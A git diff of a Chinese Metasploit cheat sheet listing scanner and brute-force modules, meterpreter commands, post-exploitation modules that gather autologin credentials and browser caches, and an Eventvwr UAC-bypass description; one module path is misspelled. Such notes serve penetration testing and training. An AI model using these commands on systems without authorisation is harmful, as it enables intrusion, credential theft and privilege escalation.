@@ -45,18 +45,18 @@ apt-get install metasploit-framework
 
 ## 信息收集
 利用 auxiliary 这个模块来获取目标网端的信息，包括端口开放情况、主机存活情况。
-```
+```bash
 auxiliary/scanner/discovery/arp_sweep
-auxiliary/scancer/smb/smb_version 存活的 445 主机
-auxiliary/scanner/portscan/syn  端口扫描
-auxiliary/scanner/telnet/telnet_version telent 服务扫描
-auxiliary/scanner/rdp/rdp_scanner 远程桌面服务扫描
-auxiliary/scanner/ssh/ssh_version ssh 主机扫描
-auxiliary/scanner/smb/smb_version smb 服务扫描
+auxiliary/scancer/smb/smb_version   # 存活的 445 主机
+auxiliary/scanner/portscan/syn  # 端口扫描
+auxiliary/scanner/telnet/telnet_version telent  # 服务扫描
+auxiliary/scanner/rdp/rdp_scanner   # 远程桌面服务扫描
+auxiliary/scanner/ssh/ssh_version ssh   # 主机扫描
+auxiliary/scanner/smb/smb_version smb   # 服务扫描
 ```
 
 爆破
-```
+```bash
 auxiliary/scanner/mysql/mysql_login
 auxiliary/scanner/mssql/mssql_login
 auxiliary/scanner/ssh/ssh_login
@@ -65,7 +65,6 @@ auxiliary/scanner/ssh/ssh_login
 ---
 
 ## meterpreter
-
 ### 快速上手
 ```bash
 shell   # 获取目标主机的 cmd shell
@@ -91,7 +90,9 @@ exploit -j  # 后台执行
 
 **环境检测**
 ```bash
-run checkvm # 查看是否是虚拟化环境
+run post/windows/gather/checkvm #是否虚拟机
+run post/linux/gather/checkvm   #是否虚拟机
+
 getuid  # 查看当前用户
 
 run post/windows/gather/enum_applications   # 获取目标主机安装软件信息；
@@ -99,6 +100,14 @@ run post/windows/gather/enum_patches    # 查看目标主机的补丁信息；
 run post/windows/gather/enum_domain # 查找目标主机域控。
 run post/windows/gather/enum_logged_on_users    # 列举当前登陆过主机的用户；
 run post/windows/gather/credentials/windows_autologin   # 抓取自动登陆的用户名和密码；
+
+run post/windows/gather/forensics/enum_drives   # 查看分区
+run post/windows/gather/enum_applications   # 获取安装软件信息
+run post/windows/gather/dumplinks   # 获取最近的文件操作
+run post/windows/gather/enum_ie # 获取 IE 缓存
+run post/windows/gather/enum_chrome # 获取 Chrome 缓存
+run post/windows/gather/enum_patches    # 补丁信息
+run post/windows/gather/enum_domain # 查找域控
 ```
 
 **抓取密码**
@@ -157,7 +166,7 @@ set session # 设为你需要 exploit 的 session
     Exploit
     ```
 
-- **通过Eventvwr注册表项**
+- **通过 Eventvwr 注册表项**
 
     首先介绍一下这个模块，此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动 Windows 事件查看器时调用的自定义命令来绕过 Windows UAC。它将生成关闭 UAC 标志的第二个 shell。此模块修改注册表项，但在调用 payload 后将清除该项。该模块不需要 payload 的体系架构和操作系统匹配。如果指定 EXE ::Custom，则应在单独的进程中启动 payload 后调用 ExitProcess（）。
     ```
